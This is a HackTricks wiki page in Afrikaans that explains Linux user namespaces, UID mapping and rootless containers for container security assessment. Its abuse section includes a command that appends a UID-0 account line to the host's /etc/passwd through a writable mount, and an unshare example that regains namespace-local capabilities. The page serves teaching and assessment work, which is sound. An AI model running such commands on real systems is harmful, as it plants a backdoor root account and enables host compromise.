# User Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die user namespace verander die betekenis van user- en group-ID's deur die kernel toe te laat om ID's wat binne die namespace gesien word, na verskillende ID's daarbuite te karteer. Dit is een van die belangrikste moderne container-beskermingsmaatreëls omdat dit die grootste historiese probleem in klassieke containers direk aanspreek: **root binne die container was vroeër ongemaklik na aan root op die host**.

Met user namespaces kan 'n proses as UID 0 binne die container loop en steeds met 'n unprivileged UID-reeks op die host ooreenstem. Dit beteken die proses kan soos root optree vir baie take binne die container, terwyl dit vanuit die host se perspektief baie minder magtig is. Dit los nie elke container-security-probleem op nie, maar dit verander die gevolge van 'n container-compromise aansienlik.

## Werking

'n User namespace het mapping-lêers soos `/proc/self/uid_map` en `/proc/self/gid_map` wat beskryf hoe namespace-ID's na parent-ID's vertaal word. As root binne die namespace na 'n unprivileged host-UID gekarteer word, dra bewerkings wat werklike host-root sou vereis, eenvoudig nie dieselfde gewig nie. Dit is waarom user namespaces sentraal staan tot **rootless containers** en waarom hulle een van die grootste verskille tussen ouer rootful container-standaardinstellings en meer moderne least-privilege-ontwerpe is.

Die punt is subtiel maar noodsaaklik: root binne die container word nie uitgeskakel nie, dit word **vertaal**. Die proses ervaar steeds plaaslik 'n root-agtige omgewing, maar die host behoort dit nie as volledige root te behandel nie.

## Lab

'n Handmatige toets is:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Dit laat die huidige gebruiker binne die namespace as root verskyn, terwyl dit steeds nie buite die namespace host root is nie. Dit is een van die beste eenvoudige demonstrasies om te verstaan waarom user namespaces so waardevol is.

In containers kan jy die sigbare mapping vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Die presiese uitvoer hang daarvan af of die engine user namespace remapping gebruik of ’n meer tradisionele rootful-konfigurasie.

Jy kan die kartering ook vanaf die host-kant lees met:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Runtimegebruik

Rootless Podman is een van die duidelikste voorbeelde van user namespaces wat as ’n eersteklas security-meganisme behandel word. Rootless Docker maak ook daarvan gebruik. Docker se userns-remap-ondersteuning verbeter veiligheid in rootful daemon-deployments ook, hoewel baie deployments dit histories gedeaktiveer het weens versoenbaarheidsredes. Kubernetes se ondersteuning vir user namespaces het verbeter, maar aanvaarding en verstekwaardes verskil volgens runtime, distro en clusterbeleid. Incus/LXC-stelsels steun ook sterk op UID/GID-shifting en idmapping-konsepte.

Die algemene tendens is duidelik: omgewings wat user namespaces ernstig gebruik, bied gewoonlik ’n beter antwoord op “wat beteken container root werklik?” as omgewings wat dit nie doen nie.

## Gevorderde Mapping-besonderhede

Wanneer ’n unprivileged proses na `uid_map` of `gid_map` skryf, pas die kernel strenger reëls toe as wanneer ’n privileged ouer-namespace-skrywer dit doen. Slegs beperkte mappings word toegelaat, en vir `gid_map` moet die skrywer gewoonlik eers `setgroups(2)` deaktiveer:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Hierdie detail is belangrik omdat dit verduidelik waarom user-namespace-opstelling soms in rootless-eksperimente misluk en waarom runtimes noukeurige helper-logika rondom UID/GID-delegering benodig.

Nog ’n gevorderde kenmerk is die **ID-mapped mount**. In plaas daarvan om eienaarskap op die skyf te verander, pas ’n ID-mapped mount ’n user-namespace-mapping op ’n mount toe sodat eienaarskap deur daardie mount-aansig vertaal lyk. Dit is veral relevant in rootless- en moderne runtime-opstellings omdat dit gedeelde host-paaie laat gebruik sonder rekursiewe `chown`-bewerkings. Vanuit ’n sekuriteitsoogpunt verander die kenmerk hoe skryfbaar ’n bind mount binne die namespace voorkom, alhoewel dit nie die onderliggende lêerstelselmetadata herskryf nie.

Onthou ten slotte dat wanneer ’n proses ’n nuwe user namespace skep of betree, dit ’n volledige capability-stel **binne daardie namespace** ontvang. Dit beteken nie dat dit skielik host-globale mag verkry het nie. Dit beteken dat daardie capabilities slegs gebruik kan word waar die namespace-model en ander beskermings dit toelaat. Dit is die rede waarom `unshare -U` skielik mounting of namespace-plaaslike bevoorregte bewerkings moontlik kan maak sonder om die host-root-grens direk te laat verdwyn.

## Wankonfigurasies

Die grootste swakheid is eenvoudig om nie user namespaces te gebruik in omgewings waar dit haalbaar sou wees nie. As container-root te direk na host-root karteer, word skryfbare host-mounts en bevoorregte kernel-bewerkings baie gevaarliker. Nog ’n probleem is om host-user-namespace-sharing af te dwing of remapping vir compatibility te deaktiveer sonder om te besef hoeveel dit die trust boundary verander.

User namespaces moet ook saam met die res van die model oorweeg word. Selfs wanneer hulle aktief is, kan breë runtime-API-blootstelling of ’n baie swak runtime-konfigurasie steeds privilege escalation deur ander paaie moontlik maak. Maar sonder hulle word baie ou breakout-klasse veel makliker om uit te buit.

## Misbruik

As die container rootful is sonder user-namespace-separation, word ’n skryfbare host bind mount aansienlik gevaarliker omdat die proses dalk werklik as host-root skryf. Gevaarlike capabilities word eweneens betekenisvoller. Die aanvaller hoef nie meer so hard teen die translation boundary te veg nie omdat die translation boundary skaars bestaan.

Die teenwoordigheid of afwesigheid van user namespaces moet vroeg nagegaan word wanneer ’n container-breakout-pad geëvalueer word. Dit beantwoord nie elke vraag nie, maar wys onmiddellik of "root in container" direkte relevansie vir die host het.

Die mees praktiese misbruikspatroon is om die mapping te bevestig en dan onmiddellik te toets of host-gemonteerde inhoud skryfbaar is met host-relevante privileges:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
As die lêer as die werklike host root geskep word, is user namespace-isolasie effektief afwesig vir daardie pad. Op daardie stadium word klassieke host-file-misbruike realisties:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
’n Veiliger bevestiging tydens ’n live assessment is om ’n onskadelike merker te skryf in plaas daarvan om kritieke lêers te wysig:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Hierdie kontroles is belangrik omdat hulle die werklike vraag vinnig beantwoord: karteer root in hierdie container na host root op ’n manier wat naby genoeg is dat ’n skryfbare host mount onmiddellik ’n pad na host-kompromittering word?

### Volledige voorbeeld: Herwinning van Namespace-Local Capabilities

As seccomp `unshare` toelaat en die omgewing ’n nuwe user namespace toelaat, kan die proses moontlik weer ’n volledige capability-stel binne daardie nuwe namespace verkry:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Dit is nie op sigself ’n host escape nie. Die rede waarom dit saak maak, is dat user namespaces bevoorregte namespace-local actions kan heraktiveer wat later met swak mounts, kwesbare kernels of swak blootgestelde runtime-surfaces gekombineer word.

## Kontroles

Hierdie opdragte is bedoel om die belangrikste vraag op hierdie bladsy te beantwoord: Waaraan word root binne hierdie container op die host gekoppel?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
Wat is hier interessant:

- As die proses UID 0 is en die maps 'n direkte of baie naby host-root mapping toon, is die container baie gevaarliker.
- As root na 'n unprivileged host range map, is dit 'n baie veiliger baseline en dui dit gewoonlik op werklike user namespace isolation.
- Die mapping files is meer waardevol as `id` alleen, omdat `id` slegs die namespace-local identity toon.

As die workload as UID 0 loop en die mapping toon dat dit nou ooreenstem met host root, moet jy die res van die container se privileges baie strenger interpreteer.
{{#include ../../../../../banners/hacktricks-training.md}}
